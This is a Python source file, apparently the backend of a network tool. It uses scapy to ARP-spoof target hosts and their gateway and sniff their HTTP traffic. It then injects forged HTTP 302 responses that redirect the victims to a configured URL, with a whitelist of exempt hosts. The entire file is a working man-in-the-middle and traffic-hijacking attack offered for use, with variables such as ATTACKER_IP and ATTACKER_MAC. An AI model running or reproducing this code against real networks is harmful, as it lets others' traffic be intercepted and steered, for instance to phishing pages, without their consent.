import sys
import json
import threading
import socket
from urllib.parse import urlparse
from scapy.all import ARP, Ether, IP, TCP, Raw, sendp, sniff, get_if_hwaddr, srp, conf
from scapy.layers.inet6 import IPv6, ICMPv6DestUnreach

# --- 通訊函式 ---
def log(level, message):
    """向前端發送日誌訊息"""
    print(json.dumps({"type": "log", "level": level, "message": message}), flush=True)

def event(event_type, data):
    """向前端發送事件"""
    print(json.dumps({"type": event_type, "data": data}), flush=True)

# --- 網路核心函式 ---
def get_mac_address(ip_address, interface):
    """根據 IP 位址獲取 MAC 位址"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, iface=interface, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except Exception as e:
        log('debug', f"get_mac_address for {ip_address} failed: {e}")
        return None

stop_event_flag = threading.Event()

def arp_spoof(gateway_ip, gateway_mac, target_macs, attacker_mac, interface):
    """持續進行 ARP 欺騙的背景執行緒"""
    while not stop_event_flag.is_set():
        try:
            for target_ip, target_mac in target_macs.items():
                if target_mac:
                    sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac), iface=interface, verbose=False)
                    sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac), iface=interface, verbose=False)
            threading.Event().wait(2)
        except Exception as e:
            log('error', f"ARP spoofing error: {e}")

def restore_arp(gateway_ip, gateway_mac, target_macs, interface):
    """恢復網路 ARP 表"""
    log('info', 'Restoring network for all targets...')
    for target_ip, target_mac in target_macs.items():
        if target_mac and gateway_mac:
            sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac), iface=interface, verbose=False, count=5)
            sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac), iface=interface, verbose=False, count=5)
    log('info', 'Network restored.')

def send_http_redirect(packet, redirect_url, interface):
    """偽造並發送一個 HTTP 302 重新導向封包"""
    http_payload = (
        f"HTTP/1.1 302 Found\r\n"
        f"Location: {redirect_url}\r\n"
        f"Connection: close\r\n"
        f"Content-Length: 0\r\n\r\n"
    ).encode('utf-8')

    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
    ip = IP(src=packet[IP].dst, dst=packet[IP].src)
    tcp = TCP(
        sport=packet[TCP].dport,
        dport=packet[TCP].sport,
        flags='PA',
        seq=packet[TCP].ack,
        ack=packet[TCP].seq + len(packet[TCP].payload)
    )
    
    response_packet = eth / ip / tcp / Raw(load=http_payload)
    sendp(response_packet, iface=interface, verbose=False)
    log('info', f"Redirected {packet[IP].src} to {redirect_url}")

# --- 主程式邏輯 ---
def main():
    try:
        config = json.loads(sys.argv[1])
        target_ips = config.get("target_ips", [])
        whitelist_urls = config.get("whitelist", [])
        redirect_url = config.get("redirect_url", "")

        if not target_ips:
            log('error', 'No target IPs specified.')
            sys.exit(1)

        route_info = conf.route
        if not route_info or not hasattr(route_info, 'route') or not route_info.route("0.0.0.0"):
            log('error', 'Unable to determine network route.')
            sys.exit(1)
        
        INTERFACE, ATTACKER_IP, GATEWAY_IP = route_info.route("0.0.0.0", verbose=False)

        if not INTERFACE or INTERFACE.startswith('lo'):
            log('error', f'Invalid network interface: {INTERFACE}')
            sys.exit(1)

        log('info', f"Network detected: IFACE={INTERFACE}, Gateway={GATEWAY_IP}")

        WHITELIST_IPS = {GATEWAY_IP, "8.8.8.8", "8.8.4.4"}
        for url_str in whitelist_urls:
            try:
                hostname = urlparse(url_str).hostname or url_str
                ip = socket.gethostbyname(hostname)
                WHITELIST_IPS.add(ip)
                log('info', f"Whitelisted {hostname} -> {ip}")
            except Exception as e:
                log('warning', f"Failed to resolve {url_str}: {e}")

        ATTACKER_MAC = get_if_hwaddr(INTERFACE)
        GATEWAY_MAC = get_mac_address(GATEWAY_IP, INTERFACE)
        
        target_macs = {}
        for ip in target_ips:
            mac = get_mac_address(ip, INTERFACE)
            if mac:
                target_macs[ip] = mac
                log('info', f"Target {ip} -> {mac}")

        if not ATTACKER_MAC or not GATEWAY_MAC or not any(target_macs.values()):
            log('error', 'Failed to retrieve necessary MAC addresses.')
            sys.exit(1)

        spoof_thread = threading.Thread(target=arp_spoof, args=(GATEWAY_IP, GATEWAY_MAC, target_macs, ATTACKER_MAC, INTERFACE))
        spoof_thread.start()
        log('info', 'ARP spoofing thread started.')

        def packet_processor(packet):
            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                if src_ip in target_macs and dst_ip not in WHITELIST_IPS:
                    if packet.haslayer(TCP) and packet[TCP].dport == 80:
                        send_http_redirect(packet, redirect_url, INTERFACE)
        
        sniff(prn=packet_processor, iface=INTERFACE, store=False, stop_filter=lambda p: stop_event_flag.is_set())
        
        spoof_thread.join()
        restore_arp(GATEWAY_IP, GATEWAY_MAC, target_macs, INTERFACE)

    except Exception as e:
        log('critical', f'A critical error occurred in backend: {e}')
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_event_flag.set()
        log('info', 'Backend terminated by user.')
